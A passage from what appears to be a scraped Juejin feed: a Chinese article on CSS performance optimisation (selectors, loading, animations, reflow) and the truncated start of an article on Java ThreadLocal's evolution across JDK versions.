t6ZsCyjlLJMz0DsDGZ8SdlDROBjOb8YeWOjptU8kTXusuaazu7oJrfEnQvdkpVcUn6PTVHyAkIIW7br/Unklni0EJIZ1WgGsauZR+fvUglz6zY0dGfVp09ybRNlfwgi3k8YSbvJJ29VMoLt9v6rZVQL7hOYUubndHJGclBtzn1byqNMCogi09/2nFb01/oj+f/5TyjauBOKtPcZ1r7qZQ3f2lRfxZPWi2anp8TSDAGExZMa2jr8u03L1M5L7q3Xc+iAeuHRl/ScvPcjSLDBnZS/cjtNHd2v3171Ewbs9N5q7Pn4otVMx3btBsCsoRbk1FxG5dMVgMDqfTpXl1/tuFMa5zKefPROdX59qLQBwLnNog8Wy1OcjB1N+QEsW/QsFNZuO35Xb1v98QLX4/Sx+O3wqujrQ6013ABUWI8+AaqBjAH01+ghL22+5X2PirnMG7r+esbnae/V1neauvGSoHjigTcVU7UGFm2DeK4ttxKpQ+mLPvl+o/PjnkAkw9HTqSMmVHhyAMx9iFcSh/BHTfLceO/C8mKjApBf9zszGhoY92m9sN+BGOY9AeD7eGniv8OTaOB4dgyTsQd9wS+IQu4lciYdkI7CLrNH3Rvbb9FL41i0tbzVP2iWJkobpN5fmM4IJfJskTP1Bk8A9HQmbpmGDBrWqdVCN/Yd7PjxKGOXn+bmbto3feVVcVB9qehIL8EJy8nChwgr0O2xxBnhGU5eP2CfYbl/m4gBRsbtneMORP9oGpjpcCsiKzHHfdOPiQ/wMniyFEu2dbiTQCAeN/vavC466BGYLttXc9fmXBXMGlAhiHHur+sq6uPiUI9z7CVHMPwBnLSuuN8FuC48/Oaz1ylt94XfrW5ouyprwWfYRkwNyCyYYjwkBHows1fa+tV/fzGxlv39b9gqvfPmQ+i/HK8KlcBjhHwfl8HEHyOd1JnuzZd66S3TTPNNNP8/wDAfwDG7G0m9LKBpwAAAABJRU5ErkJggg==) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1、前言</h2>
<p>当涉及到网站的性能优化时，CSS 的优化是一个非常重要的方面。如果你的 CSS 太复杂，那么你的网站可能会像一个<strong>慢吞吞的乌龟</strong>一样缓慢地加载和渲染，影响<strong>用户的留存</strong>、<strong>网站的转化率</strong>以及<strong>网站的体验和传播</strong>等，所以对于 CSS 优化还是非常需要的，本文将介绍一些 CSS 性能优化的技巧，帮助你在编写 CSS 代码时提高性能。</p>
<h2 data-id="heading-1">2、前置知识</h2>
<h3 data-id="heading-2">2.1 CSS 解析规则</h3>
<p>我们一般书写 CSS 选择器都是从左往右书写的，所以自然就会以为 CSS 选择器是从左往右去匹配渲染的，但其实不是这样的，<strong>CSS 选择器是从右往左去匹配的</strong>。</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.header</span> <span class="hljs-selector-tag">div</span> <span class="hljs-selector-tag">span</span> { 
  <span class="hljs-attribute">color</span>: red;
}
</code></pre>
<p>比如上面的 CSS 样式匹配查找过程是这样的：</p>
<ol>
<li>先找到所有的 <code>span</code> 元素。</li>
<li>从第一个 <code>span</code> 元素开始，沿着 <code>span</code> 元素的父级元素查到 <code>div</code>，最后沿着 <code>div</code> 的父级元素找到所有的 <code>.header</code>，找到满足条件的节点就加入到结果集中。</li>
</ol>
<h3 data-id="heading-3">2.2 CSS 的加载过程</h3>
<p><strong>简述浏览器的渲染过程</strong>：在拿到 html 文件后，浏览器会调用 html 解析器解析 html 文件，构建 DOM 树和 CSSOM 树，然后 DOM 树和 CSSOM 树合并成渲染树，最后浏览器会根据渲染树进行布局和绘制，最终将页面呈现给用户。</p>
<p><strong>CSSOM 的构建</strong>：当浏览器解析 html 文档时，如果遇到 <code>&lt;link&gt;</code> 或 <code>&lt;style&gt;</code> 标签，会开始下载和解析 CSS 文件，构建 CSSOM。在 CSSOM 构建完成之前，浏览器不会渲染任何已处理的内容，即使DOM已经解析完毕。</p>
<ul>
<li>CSS 不会阻塞 <code>DOM</code> 的解析，但会阻塞 <code>DOM</code> 的渲染。</li>
<li>CSS 不会阻塞 <code>Javascript</code> 的下载，但会阻塞 <code>JavaScript</code> 的执行，因为 <code>JavaScript</code> 可以操作样式，所以需要等 <code>CSSOM</code> 构建完成之后，才能执行 <code>JavaScript</code>。</li>
</ul>
<p>所以从这里就可以得到以下优化思路：。</p>
<ul>
<li>将一些<strong>体积小的首屏关键 CSS</strong> 内联到 <code>html</code> 文件中，加快首屏渲染速度。</li>
<li>将 CSS 放在 <code>&lt;head&gt;</code> 中，确保尽早加载。</li>
<li>使用媒体查询（如 <code>media="print"</code>）使 CSS 非阻塞渲染。</li>
<li>在生产环境中，考虑使用 preload（如 <code>&lt;link rel="preload" as="style"&gt;</code>）在不阻塞渲染的情况下加载非首屏的 CSS 资源。</li>
</ul>
<h3 data-id="heading-4">2.3 CSS 权重优先级</h3>
<p>CSS 选择器类型的优先级从低往高依次是：</p>
<ol>
<li><strong>类型选择器</strong>（比如 <code>h1</code>）和<strong>伪元素选择器</strong>（比如 <code>::before</code>）。</li>
<li><strong>类选择器</strong>（比如 <code>.header</code>）、<strong>属性选择器</strong>（比如 <code>[type="checkbox"]</code>）和<strong>伪类选择器</strong>（比如 <code>:hover</code>）。</li>
<li><strong>ID 选择器</strong>（比如 <code>#box</code>）。</li>
<li><strong>!important</strong>：优先级最高。</li>
</ol>
<h2 data-id="heading-5">2、CSS 加载性能优化</h2>
<h3 data-id="heading-6">2.1. 提取公共的 CSS 文件</h3>
<p>如果使用<code>webpack</code>进行项目打包，在打包阶段可以使用<code>mini-css-extract-plugin</code>提取公共 CSS 文件，便于缓存以及减少 CSS 请求次数。</p>
<h3 data-id="heading-7">2.2 避免使用 @import</h3>
<ul>
<li>使用 <code>@import</code> 会阻塞浏览器的并行下载，导致加载速度变慢。</li>
<li>多个 <code>@import</code> 会导致下载顺序紊乱。</li>
</ul>
<h3 data-id="heading-8">2.3 压缩 CSS 文件</h3>
<p>压缩 CSS 文件可以减小文件大小，从而加快加载速度。比如可以用<code>optimize-css-assets-webpack-plugin</code>配合<code>mini-css-extract-plugin</code>使用来优化和压缩 CSS 文件。</p>
<h3 data-id="heading-9">2.4 使用浏览器缓存</h3>
<p>可以使用浏览器缓存来缓存 CSS 文件，从而在页面加载时加快速度。可以设置适当的缓存时间来确保文件在必要时能够更新。</p>
<h3 data-id="heading-10">2.5 使用 CDN 加速</h3>
<ul>
<li>使用 <strong>CDN（内容分发网络）</strong> 可以将 CSS 文件分发到全国各个 <code>CDN</code> 节点的服务器上，用户可以就近下载，从而加快加载速度，也可以减少自己服务器的负载。</li>
<li>如果静态资源很多，可以准备多个静态服务器域名，比如域名是 <code>static.xx.com</code>，做成支持 <code>static0-5</code> 的 6 个域名, 也就是 <code>static0.xx.com、static1.xx.com、static2.xx.com...</code>，每次请求时随机选一个域名地址进行请求，这样可以绕过浏览器同域名的连接数限制（一般是限制 6 个），6 个域名就可以同时发送 36 个连接请求。当然，这个域名个数不是越多越好，太分散的话又会涉及到多域名无法缓存静态资源的问题。</li>
</ul>
<h3 data-id="heading-11">2.6 使用 CSS Sprite</h3>
<p><strong>CSS Sprite</strong> 技术就是我们常说的<strong>雪碧图</strong>，通过将多张小图标拼接成一张大图，能有效的<strong>减少HTTP请求数量</strong>以达到加速显示内容的技术。</p>
<h3 data-id="heading-12">2.7 CSS 样式抽离和去除无用 CSS</h3>
<ul>
<li>平时开发过程中可以将一些<strong>可复用</strong>的 CSS 抽离到一个单独文件中，减少 CSS 代码冗余。</li>
<li>在打包构建时可以利用一些插件去除没有用到的 CSS，相当于对 CSS 进行 <code>Tree shaking</code>，减少打包后体积。</li>
</ul>
<h3 data-id="heading-13">2.8 合理使用内嵌 CSS</h3>
<p><code>内嵌CSS</code> 也就是通过元素的 <code>style</code> 来书写行内样式，比如 <code>&lt;div style="color: red"&gt;&lt;/div&gt;</code>，它的优缺点如下：</p>
<p><strong>优点</strong>：</p>
<ul>
<li>与使用 <code>link</code> 标签相比，可以减少 CSS 的 <code>http</code> 请求量。</li>
</ul>
<p><strong>缺点</strong>：</p>
<ul>
<li>增加 <code>html</code> 文件的体积。</li>
<li>使用 <code>link</code> 标签能很好的利用浏览器的缓存，而内联样式放在 <code>html</code> 里面，能否使用缓存需要看 <code>html</code> 文件的缓存策略。</li>
</ul>
<p>综合它的优缺点，我们可以选择将一些<strong>体积小的首屏关键 CSS</strong> 内联到 <code>html</code> 文件中，加快首屏渲染速度。</p>
<h2 data-id="heading-14">3、CSS 选择器性能优化</h2>
<h3 data-id="heading-15">3.1 避免使用通配符选择器</h3>
<p>通配符选择器<code>*</code>符号可以匹配任何元素，但是这会导致浏览器需要遍历整个文档树来查找匹配的元素，从而降低性能。</p>
<h3 data-id="heading-16">3.2 使用子选择器代替后代选择器</h3>
<p>后代选择器（如 <code>.parent .child</code>）会检查所有后代元素，而子选择器（如 <code>.parent &gt; .child</code>）只检查直接子元素，匹配范围更小，性能更好。</p>
<h3 data-id="heading-17">3.3 优先使用类（Class）和 ID 选择器</h3>
<p>类选择器（如 <code>.box</code>）和 ID 选择器（如 <code>#box</code>）匹配速度更快，因为它们直接指向特定元素。避免标签选择器（如 <code>div</code>）或属性选择器（如 [type="text"]），后者匹配更加宽泛，效率较低，尤其在大型 DOM 中。</p>
<h3 data-id="heading-18">3.4 避免深层嵌套的选择器</h3>
<p>前面也说过，CSS 选择器需要从右往左去匹配的，嵌套的选择器如 <code>.header div ul li a</code>，因为浏览器需要遍历更多 DOM 节点。建议限制选择器深度在 3 层以内，使用更直接的类或 ID 选择器，如 <code>.box</code>。这能减少匹配时间。或者使用 <code>BEM</code> 命名规范，比如 <code>.block__element--modifier</code>，提高匹配效率。</p>
<p>另外在使用 ID 选择器的时候，前面就需要加上父级的选择器，比如不推荐用 <code>.box #content</code>，推荐用 <code>#content</code>。</p>
<h2 data-id="heading-19">4、CSS 属性性能优化</h2>
<h3 data-id="heading-20">4.1 避免使用过于复杂的属性</h3>
<p>过于复杂的属性会增加浏览器的渲染负担，从而降低性能。应该尽量使用简单的属性来实现需要的样式效果，比如下面这些属性：</p>
<ul>
<li><strong>box-shadow</strong>：box-shadow 属性可以实现盒子的阴影效果，但是它会增加浏览器的计算和渲染成本。如果要实现一个简单的边框效果，可以使用 <code>border</code> 属性来替代。</li>
</ul>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 不推荐使用 */</span>
<span class="hljs-selector-class">.box</span> {
  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> <span class="hljs-number">#888</span>;
}

<span class="hljs-comment">/* 推荐使用 */</span>
<span class="hljs-selector-class">.box</span> {
  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#888</span>;
}
</code></pre>
<ul>
<li><strong>filter</strong>：filter 属性可以实现图像的滤镜效果，但是它会增加浏览器的计算和渲染成本。如果要实现一个简单的颜色变换效果，可以使用 <code>background-color</code> 属性来替代。</li>
</ul>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 不推荐使用 */</span>
<span class="hljs-selector-class">.box</span> {
  <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">grayscale</span>(<span class="hljs-number">50%</span>);
}

<span class="hljs-comment">/* 推荐使用 */</span>
<span class="hljs-selector-class">.box</span> {
  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ccc</span>;
}
</code></pre>
<p>不过需要注意的是，这些替代方案可能会有一些<strong>局限性</strong>，无法完全取代原来的属性。因此，在使用这些替代方案时，需要根据具体的需求和情况进行选择。</p>
<h3 data-id="heading-21">4.2 避免使用不必要的属性</h3>
<p>不必要的属性会增加 <code>CSS</code> 文件的大小，从而降低加载速度。应该尽量避免使用不必要的属性。</p>
<h3 data-id="heading-22">4.3 避免使用 !important</h3>
<p><code>!important</code> 会覆盖其他样式，从而增加渲染时间。而且它不容易被替换或覆盖，后期可维护性也比较差，更好的方式使用更具体、更准确的选择器来定义样式。</p>
<h2 data-id="heading-23">5、CSS 动画性能优化</h2>
<h3 data-id="heading-24">5.1 使用 transform 和 opacity 属性来进行动画</h3>
<p>使用 <code>transform</code> 和 <code>opacity</code> 属性可以减少浏览器的渲染负担，从而提高性能。</p>
<h3 data-id="heading-25">5.2 避免使用过于复杂的动画效果</h3>
<p>过于复杂的动画效果会增加浏览器的渲染负担，从而降低性能。应该尽量使用简单的动画效果。</p>
<h3 data-id="heading-26">5.3 在动画中使用 will-change 属性</h3>
<p><code>will-change</code> 属性可以告诉浏览器哪些属性将要被改变，从而提前进行优化，减少渲染负担。</p>
<h3 data-id="heading-27">5.4 使用 requestAnimationFrame() 函数来优化动画</h3>
<p><code>requestAnimationFrame()</code> 函数可以在浏览器下一次渲染之前执行代码，从而减少渲染负担，提高性能。</p>
<h2 data-id="heading-28">6、CSS 渲染性能优化</h2>
<h3 data-id="heading-29">6.1 使用 class 合并 DOM 的修改</h3>
<p>比如我们需要根据不同情况给一个元素添加不同的样式，可能会写出如下的代码：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> el = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.box'</span>);
<span class="hljs-keyword">if</span> (isHover) {
  el.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = <span class="hljs-string">'red'</span>;
  el.<span class="hljs-property">style</span>.<span class="hljs-property">background</span> = <span class="hljs-string">'blue'</span>;
} <span class="hljs-keyword">else</span> {
  el.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = <span class="hljs-string">'blue'</span>;
  el.<span class="hljs-property">style</span>.<span class="hljs-property">background</span> = <span class="hljs-string">'red'</span>;
}
</code></pre>
<p>这时候我们可以定义两个 <code>class</code> 类，然后直接切换类名即可。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> el = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.box'</span>);
<span class="hljs-keyword">if</span> (isHover) {
  el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'normal'</span>);
  el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'hover'</span>);
} <span class="hljs-keyword">else</span> {
  el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'hover'</span>);
  el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'normal'</span>);
}
</code></pre>
<h3 data-id="heading-30">6.2 让 DOM 元素脱离文档流</h3>
<p>使用 <code>absoulte</code> 或者 <code>fixed</code> 定位让 DOM 元素脱离文档流，这样在修改 DOM 元素的时候不会影响到其他 DOM 元素的布局，从而提高渲染性能。</p>
<h2 data-id="heading-31">7、总结</h2>
<p>本文主要通过<strong>CSS 加载性能优化</strong>、<strong>CSS 选择器性能优化</strong>、<strong>CSS 属性性能优化</strong>、<strong>CSS 动画性能优化</strong>和<strong>CSS 渲染性能优化</strong>这些方向介绍了 CSS 的性能优化技巧。通过优化 CSS 性能，可以提高网站的性能和用户体验。</p>
<p>在实际开发中，可根据实际业务场景和需要去进行优化。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从 JDK1.2 到 JDK21：ThreadLocal的进化解决了什么问题]]></title>    <link>https://juejin.cn/post/7575367791272804390</link>    <guid>https://juejin.cn/post/7575367791272804390</guid>    <pubDate>2025-11-23T09:55:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575367791272804390" data-draft-id="7575182522411335718" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从 JDK1.2 到 JDK21：ThreadLocal的进化解决了什么问题"/> <meta itemprop="keywords" content="后端,Java,面试"/> <meta itemprop="datePublished" content="2025-11-23T09:55:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一只叫煤球的猫"/> <meta itemprop="url" content="https://juejin.cn/user/1732486058745054"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从 JDK1.2 到 JDK21：ThreadLocal的进化解决了什么问题
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1732486058745054/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一只叫煤球的猫
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T09:55:30.000Z" title="Sun Nov 23 2025 09:55:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. JDK 1.2：ThreadLocal 初版（最小可用）</h2>
<p><strong>核心特点：</strong></p>
<ul>
<li><code>ThreadLocal</code> 首次出现。</li>
<li>每个线程维护自己的 <code>ThreadLocalMap</code>。</li>
<li><code>ThreadLocalMap</code> 的 key 就是 <code>ThreadLocal</code> 本身。</li>
<li>底层使用开放地址法的哈希表（<code>Entry[] table</code>）。</li>
<li><strong>key 不是弱引用</strong>，导致 ThreadLocal 对象不释放时可能造成内存泄漏。</li>
</ul>
<p><strong>主要问题：</strong></p>
<ul>
<li>ThreadLocal 实例如果被 GC 回收前未手动 <code>remove()</code>，线程（尤其是线程池）不会结束，Entry 永远存在，导致 value 泄漏。</li>
</ul>
<p>这也是行业里常说的 ThreadLocal 泄漏最初来源。</p>
<hr/>
<h2 data-id="heading-1">2. JDK 1.3 ~ 1.4：Bug 修复 + 行为稳定</h2>
<p><strong>关键改动：</strong></p>
<ul>
<li>增强清理机制，但依然是 key 强引用。</li>
<li>修复部分扩容和冲突处理问题。</li>
</ul>
<p>但根本性的泄漏问题仍然存在。</p>
<hr/>
<h2 data-id="heading-2">3. JDK 5：引入弱引用（关键里程碑）</h2>
<p>这是 ThreadLocal 设计史上最重要的变更。</p>
<p><strong>重大更新：</strong></p>
<ul>
<li>
<p><code>ThreadLocalMap.Entry</code> 改为 <strong>弱引用</strong>：</p>
